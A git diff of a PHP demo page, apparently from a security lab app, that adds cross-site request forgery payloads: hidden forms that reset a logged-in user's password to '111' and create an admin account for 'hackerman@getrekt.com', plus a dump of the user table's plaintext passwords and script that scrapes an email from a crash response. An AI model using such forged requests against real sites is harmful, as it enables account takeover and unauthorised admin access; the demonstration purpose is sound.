@@ -30,9 +30,6 @@ require_once "../src/DBController.php";
         <main>
             <h1>Cross Site Request Forgery Test</h1>
             <p>Current logged in as: <?php echo $_SESSION['email'];?></p>
-            <p>
-                To test: Login first, then navigate to this page. Press the button. The user is now enrolled with CRN 111 even if they are not a student.
-            </p>
 
             <label class="csrf_label">Cross Site Request Forgery:
             <select name="csrf" id="csrf" onchange="changeCSRF()">
@@ -43,6 +40,9 @@ require_once "../src/DBController.php";
             </select>
 
             <div id="maliciouscode">
+                <p>
+                    To test: Login first, then navigate to this page. Press the button. The user's password is now 111.
+                </p>
                 <form action="http://localhost:8000/src/ForgotPasswordChangeLogic.php" method="POST" onsubmit="return ajaxSend();" name="changepassword">
                     <input type="hidden" name="newpassword" value="111" />
                     <input type="hidden" name="confirmpassword" value="111" />
@@ -51,21 +51,23 @@ require_once "../src/DBController.php";
             </div>
             <?php
             $sql =<<<EOF
-                    Select * From Enrollment;
+                    Select * From User;
                     EOF;
                     $ret = $db->query($sql);
-                echo "<h1>Enrollment Table Contents</h1>";
+                echo "<div id='usertableinfo'><h1>User Table Contents</h1>";
                 while($row = $ret->fetchArray(SQLITE3_ASSOC) )
                 {
-                    echo "<p>CRN = " . $row['CRN'] . "\n</p>";
-                    echo "<p>StudentID = " . $row['StudentID'] . "\n</p>";
+                    echo "<p>Email = " . $row['Email'] . "\n</p>";
+                    echo "<p>Password = " . $row['Password'] . "\n</p>";
+                    echo "<br>";
                 }
+                echo "</div>";
             ?>
         </main>
     </div>
 
     <script>
-        function changeinjection ()
+        function changeCSRF ()
         {
             //get elements from page
             var csrf = document.getElementById("csrf");
@@ -87,6 +89,7 @@ require_once "../src/DBController.php";
             if(csrf.options[csrf.selectedIndex].value === "1")
             {
                 maliciouscode.innerHTML =
+                    "<p> To test: Login first, then navigate to this page. Press the button. The user's password is now 111. </p>"+
                     "<form action=\"http://localhost:8000/src/ForgotPasswordChangeLogic.php\" method=\"POST\" onsubmit=\"return ajaxSend();\" name=\"changepassword\">" +
                         "<input type=\"hidden\" name=\"newpassword\" value=\"111\" />" +
                         "<input type=\"hidden\" name=\"confirmpassword\" value=\"111\" />" +
@@ -95,7 +98,21 @@ require_once "../src/DBController.php";
             }
             else if(csrf.options[csrf.selectedIndex].value === "2")
             {
-                injectiondiv.innerHTML = ""
+                maliciouscode.innerHTML =
+                    "<p> This can be done without a user's session. The email will be hackerman@getrekt.com and password will be 111. </p>"+
+                    "<form action=\"http://localhost:8000/src/CreateAccountUpdateLogic.php\" method=\"POST\" onsubmit=\"return ajaxSend();\" name=\"changepassword\">" +
+                        "<input type=\"hidden\" name=\"acctype\" value=\"1\" />" +
+                        "<input type=\"hidden\" name=\"password\" value=\"111\" />" +
+                        "<input type=\"hidden\" name=\"fname\" value=\"Hacker\" />" +
+                        "<input type=\"hidden\" name=\"lname\" value=\"Man\" />" +
+                        "<input type=\"hidden\" name=\"dob\" value=\"\" />" +
+                        "<input type=\"hidden\" name=\"email\" value=\"hackerman@getrekt.com\" />" +
+                        "<input type=\"hidden\" name=\"studentyear\" value=\"\" />" +
+                        "<input type=\"hidden\" name=\"facultyrank\" value=\"\" />" +
+                        "<input type=\"hidden\" name=\"squestion\" value=\"lol\" />" +
+                        "<input type=\"hidden\" name=\"sanswer\" value=\"get rekt\" />" +
+                        "<button class=\"button_large\" type=\"submit\">Create an admin account</button>" +
+                    "</form>";
             }
         }
 
@@ -109,9 +126,10 @@ require_once "../src/DBController.php";
             xhr1.open('POST', "../src/CourseEnrollInsertLogic.php", true);
             xhr1.onload = function () {
                 let crashData = this.response;
+                //we need to obtain the email from crashData: it looks like the following
                 //["email"]=> string(some number) "Email appears here"
-                //var pattern = new RegExp( "[" + "'email'" + "]" + " string" + "(" + "(\\d{2})" + ")" );
 
+                //get the email
                 let email = crashData.substr(crashData.indexOf('["email"]=>')+ 11).slice(0, -1);
                 email = email.substr(email.indexOf('"')+ 1).slice(0, -1);
                 email = email.split('"')[0];
